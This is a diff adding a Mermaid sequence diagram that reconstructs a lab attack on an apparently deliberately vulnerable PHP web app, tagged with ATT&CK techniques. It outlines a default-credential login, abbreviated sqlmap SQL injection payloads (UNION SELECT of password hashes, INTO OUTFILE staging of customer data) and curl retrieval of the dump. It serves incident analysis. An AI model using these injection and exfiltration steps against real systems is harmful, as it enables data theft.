@@ -1,0 +1,25 @@
+sequenceDiagram
+    autonumber
+    participant A as Attacker 192.168.56.10
+    participant W as Web server 192.168.56.30:80
+    Note over A,W: 2026-11-03T13:20:00Z Session A (Firefox UA, port 52110)
+    A->>W: GET /login.php
+    W-->>A: 200 (3927 B)
+    A->>W: POST /login.php (username=admin&password=password, 44 B cleartext)
+    W-->>A: 302 to index.php + Set-Cookie PHPSESSID, security=low
+    A->>W: GET /index.php, /vulnerabilities/sqli/, ?id=1 (cookie reused)
+    W-->>A: 200 (3927 / 3923 / 3954 B)
+    Note over A,W: 2026-11-03T13:21:35.455Z Session B (sqlmap UA, port 52112) T1190
+    A->>W: id=1' (probe) -> OR '1'='1 -> ORDER BY 1,2,3
+    W-->>A: 200 (4095, 4159, 3978, 3978, 3979 B; ORDER BY 3 error -> 2 columns)
+    A->>W: UNION SELECT 1,2 / user(),database()
+    W-->>A: 200 (4016 / 4031 B)
+    A->>W: UNION SELECT information_schema.tables / columns
+    W-->>A: 200 (4121 / 4241 B: guestbook, users, customers)
+    A->>W: UNION SELECT user,password FROM users
+    W-->>A: 200 (4345 B: five password hashes)
+    A->>W: 13:21:42.067Z UNION SELECT ... INTO OUTFILE /var/www/html/dump/customers.csv
+    W-->>A: 200 (3978 B; staging inferred)
+    Note over A,W: 2026-11-03T13:22:12.874Z Session C (curl UA, port 52140) T1048.003
+    A->>W: GET /dump/customers.csv
+    W-->>A: 200 text/csv, 28370 B, 501 lines, SHA-256 9b44747e...ca4c6
